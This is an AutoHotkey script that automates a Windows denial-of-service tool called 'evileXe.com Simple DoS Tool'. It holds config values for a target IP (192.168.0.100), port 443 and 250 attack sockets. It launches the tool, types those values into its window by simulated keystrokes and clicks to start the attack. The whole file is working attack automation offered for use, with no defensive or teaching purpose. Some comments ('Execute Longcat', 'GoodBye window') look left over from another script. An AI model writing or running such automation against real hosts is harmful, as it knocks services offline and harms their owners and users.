#CommentFlag //

// ------------------------------------------------
// CONFIG
// ------------------------------------------------

simpledostool_path = C:\DoStools\SimpleDosTool.exe

target_ip = 192.168.0.100
target_port = 443

attack_socks = 250


// ------------------------------------------------
// MAIN SCRIPT
// ------------------------------------------------

// Execute Longcat
Run, %simpledostool_path%

// Give focus to GoodBye window
WinActivate, evileXe.com Simple DoS Tool
WinWaitActive, evileXe.com Simple DoS Tool

// Target IP
Loop 9 {
	Send {Del}	
}
SendInput, %target_ip%

// Target port
Send {TAB}	
Send {Del}
Send {Del}
SendInput, %target_port%

// Attack socks
Send {TAB}
Send {Del}
Send {Del}
Send {Del}
SendInput, %attack_socks%

// Execute attack
MouseMove, 116, 90
Click